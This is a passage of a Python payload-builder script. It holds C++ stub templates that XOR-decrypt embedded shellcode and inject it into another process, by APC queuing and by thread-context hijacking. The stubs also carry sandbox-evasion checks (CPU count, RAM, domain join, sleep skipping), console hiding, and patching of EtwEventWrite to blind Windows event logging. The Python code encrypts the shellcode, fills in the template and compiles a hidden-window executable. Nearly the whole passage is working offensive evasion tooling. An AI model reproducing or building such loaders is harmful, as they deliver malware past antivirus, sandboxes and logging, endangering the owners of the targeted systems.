        THREADENTRY32 t_entry = { sizeof(THREADENTRY32) };
        std::vector<DWORD> tids = std::vector<DWORD>();
        BOOL valid_thread = Thread32First(snapshot, &t_entry);

        while (valid_thread) {
                if (t_entry.th32OwnerProcessID == procID) {
                        tids.push_back(t_entry.th32ThreadID);
                }

                valid_thread = Thread32Next(snapshot, &t_entry);

                for (int i = 0; i < tids.size(); i++) {

                        DWORD tid = tids.at(i);
                        cid.UniqueProcess = NULL;
                        cid.UniqueThread = (HANDLE)tid;

                        NtOpenThread(&hThread, THREAD_ALL_ACCESS, &oa, &cid);
                        NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)rbuffer, NULL, NULL, NULL);
                        NtClose(hThread);

                        }
                }
        NtClose(targetproc);
}


// --- MAIN ---
int main(int argc, char** argv) {

        char* holderID = argv[1];
        int PID = atoi(holderID);
        
        //PROCREPLACEprocessors();
        //DOMAINREPLACEdomainJoined();
        //RAMREPLACEram();
        //LONGSLEEPREPLACEskipSleep();
        //WINDOWHIDERShowWindow(GetConsoleWindow(), SW_HIDE);
        HANDLE target = getHandle(PID);
        //PATCHETWREPLACEpatchETW();
        //PATCHETWREMOTEREPLACEpatchETWRemote(target);
        run(target, PID);
        
}

"""

stub6 = """
#include <windows.h>
#include <iostream>
#include "syscalls.h"
#include "lm.h"
#include <tlhelp32.h>

#pragma comment(lib, "netapi32.lib")

unsigned char shellcode[] = SHELLCODE_REPLACE

size_t shellcode_len = sizeof(shellcode);

char key[] = "XORKEY_REPLACE"; 

// --- XOR Decryption Routine ---
void XOR(char* data, size_t data_len, char* key, size_t key_len) {

        int j;
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;
                data[i] = data[i] ^ key[j];
                j++;
        }
}

/*PROCESSORS
void processors() {

        int minprocs = NUMBER_OF_PROCS_REPLACE;
        SYSTEM_INFO sysinfo;
        GetSystemInfo(&sysinfo);
        int numprocs = sysinfo.dwNumberOfProcessors;
        if (numprocs < minprocs) {
                exit(0);
        }
}
PROCESSORS*/

/*DOMAINJOINED
void domainJoined() {

        // Check if domain joined
        PWSTR domainName;
        NETSETUP_JOIN_STATUS status;
        NetGetJoinInformation(NULL, &domainName, &status);
        if (status != NetSetupDomainName) {
                exit(0);
        }
}
DOMAINJOINED*/

/*RAM
void ram() {

        // Check if <X RAM
        MEMORYSTATUSEX totram;
        totram.dwLength = sizeof(totram);
        GlobalMemoryStatusEx(&totram);
        if ((float)totram.ullTotalPhys / 1073741824 < GB_OF_RAM_REPLACE) {
                exit(0);
        }
}
RAM*/

/*LONGSLEEP
void skipSleep() {

        // Check if long sleeps fast forwarded
        DWORD uptimebeforesleep = GetTickCount();
        LARGE_INTEGER Interval;
        Interval.QuadPart = -900000000;
        NtDelayExecution(FALSE, &Interval);
        DWORD uptimeaftersleep = GetTickCount();

        // If sleep accelerated exit (sleep for 90s, if time passed <75s exit)
        if (uptimeaftersleep - uptimebeforesleep < 75000) {
                exit(0);
        };
}
LONGSLEEP*/

/*PATCHETWLOCAL
int patchETW(void) {

        HANDLE curproc = GetCurrentProcess();
        UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
        size_t size = sizeof(patch);

        unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
        LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

        // Alternative Method : LPVOID EEWAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");

        DWORD oldprotect;
        LPVOID lpBaseAddress = EEWAddress;
        ULONG NewProtection;

        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
        NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

        return 0;
}
PATCHETWLOCAL*/

/*PATCHETWREMOTE
void patchETWRemote(HANDLE remoteProc) {

        HANDLE targetProcHandle = remoteProc;

        DWORD oldprotect1;
        ULONG NewProtection1;

        UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
        size_t size = sizeof(patch);

        unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

        LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);
        LPVOID lpBaseAddress = EEWAddress;

        NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect1);
        NtWriteVirtualMemory(targetProcHandle, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
        NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);

}
PATCHETWREMOTE*/

HANDLE getHandle(int processID) {

        HANDLE targetProcHandle;
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
        CLIENT_ID cid;
        cid.UniqueProcess = (PVOID)processID;
        cid.UniqueThread = 0;

        NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);

        return targetProcHandle;

}

void run(HANDLE remoteProc, int processID) {

        HANDLE threadHijack = NULL;
        HANDLE snapshot;
        PVOID remoteBuffer;
        SIZE_T byteswritten = 0;
        ULONG oldprotect = 0;
        THREADENTRY32 threadentry;
        CONTEXT context;
        context.ContextFlags = CONTEXT_FULL;
        threadentry.dwSize = sizeof(THREADENTRY32);

        OBJECT_ATTRIBUTES oa2;
        InitializeObjectAttributes(&oa2, NULL, 0, NULL, 0);
        CLIENT_ID cid2;
        cid2.UniqueProcess = 0;

        XOR((char*)shellcode, shellcode_len, key, sizeof(key));
        NtAllocateVirtualMemory(remoteProc, &remoteBuffer, 0, &shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        NtWriteVirtualMemory(remoteProc, remoteBuffer, shellcode, sizeof(shellcode), &byteswritten);
        NtProtectVirtualMemory(remoteProc, &remoteBuffer, &shellcode_len, PAGE_EXECUTE_READ, &oldprotect);

        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        Thread32First(snapshot, &threadentry);

        while (Thread32Next(snapshot, &threadentry)) {
                if (threadentry.th32OwnerProcessID == processID) {
                        cid2.UniqueThread = (HANDLE)threadentry.th32ThreadID;
                        NtOpenThread(&threadHijack, THREAD_ALL_ACCESS, &oa2, &cid2);
                        break;
                }
        }

        NtSuspendThread(threadHijack, NULL);

        NtGetContextThread(threadHijack, &context);
        context.Rip = (DWORD_PTR)remoteBuffer;
        NtSetContextThread(threadHijack, &context);

        NtResumeThread(threadHijack, NULL);

        NtClose(threadHijack);
        NtClose(remoteProc);

}

// --- MAIN ---
int main(int argc, char** argv) {

        char* holderID = argv[1];
        int PID = atoi(holderID);
        
        //PROCREPLACEprocessors();
        //DOMAINREPLACEdomainJoined();
        //RAMREPLACEram();
        //LONGSLEEPREPLACEskipSleep();
        //WINDOWHIDERShowWindow(GetConsoleWindow(), SW_HIDE);
        HANDLE target = getHandle(PID);
        //PATCHETWREPLACEpatchETW();
        //PATCHETWREMOTEREPLACEpatchETWRemote(target);
        run(target, PID);

}


"""

def genkey():
    letters = string.ascii_letters
    key = ""
    for i in range(7):
        z = random.choice(letters)
        key = key + z
    return key

def xor(data, key):
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        o = lambda x: x if isinstance(x, int) else ord(x)
        output_str += chr(o(current) ^ ord(current_key))

    ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
    return ciphertext

def main():

    try:
        plaintext = open(iFile, 'rb').read()
    except:
        print("\nUnable to read shellcode file input\n\nExiting...")
        sys.exit()

    xorKey = genkey()
    shellcode = xor(plaintext, xorKey)

    if method == "1":
        stubnumber = stub1
    elif method == "2":
        stubnumber = stub2
    elif method == "3":
        stubnumber = stub3
    elif method == "4":
        stubnumber = stub4
    elif method == "5":
        stubnumber = stub5
    elif method == "6":
        stubnumber = stub6
    else:
        print("Invalid execution method, exiting...")
        sys.exit()

    stubnumber = stubnumber.replace("SHELLCODE_REPLACE", shellcode)
    stubnumber = stubnumber.replace("XORKEY_REPLACE", xorKey)

    if processors:
        stubnumber = stubnumber.replace("/*PROCESSORS", "")
        stubnumber = stubnumber.replace("NUMBER_OF_PROCS_REPLACE", processors)
        stubnumber = stubnumber.replace("PROCESSORS*/", "")
        stubnumber = stubnumber.replace("//PROCREPLACE", "")

    if domainjoined:
        stubnumber = stubnumber.replace("/*DOMAINJOINED", "")
        stubnumber = stubnumber.replace("DOMAINJOINED*/", "")
        stubnumber = stubnumber.replace("//DOMAINREPLACE", "")

    if ram:
        stubnumber = stubnumber.replace("/*RAM", "")
        stubnumber = stubnumber.replace("GB_OF_RAM_REPLACE", ram)
        stubnumber = stubnumber.replace("RAM*/", "")
        stubnumber = stubnumber.replace("//RAMREPLACE", "")

    if sleepcheck:
        stubnumber = stubnumber.replace("/*LONGSLEEP", "")
        stubnumber = stubnumber.replace("LONGSLEEP*/", "")
        stubnumber = stubnumber.replace("//LONGSLEEPREPLACE", "")

    if console:
        stubnumber = stubnumber.replace("//WINDOWHIDER", "")

    if etw:
        stubnumber = stubnumber.replace("/*PATCHETWLOCAL", "")
        stubnumber = stubnumber.replace("PATCHETWLOCAL*/", "")
        stubnumber = stubnumber.replace("//PATCHETWREPLACE", "")

        injectionmethods = ["3", "4", "5", "6"]

        if method in injectionmethods:
            stubnumber = stubnumber.replace("/*PATCHETWREMOTE", "")
            stubnumber = stubnumber.replace("PATCHETWREMOTE*/", "")
            stubnumber = stubnumber.replace("//PATCHETWREMOTEREPLACE", "")

    if method == "4":
        stubnumber = stubnumber.replace("PARENTPROCESSREPLACE", parent)
        stubnumber = stubnumber.replace("CHILDPROCESSREPLACE", child)

    template = open("temp.cpp", "w+")
    template.write(stubnumber)
    template.close()

    os.system("x86_64-w64-mingw32-g++ temp.cpp netapi32.dll -w -masm=intel -fpermissive -static -Wl,--subsystem,windows -O0 -o " + output + ".exe")
    os.system("rm temp.cpp")

main()
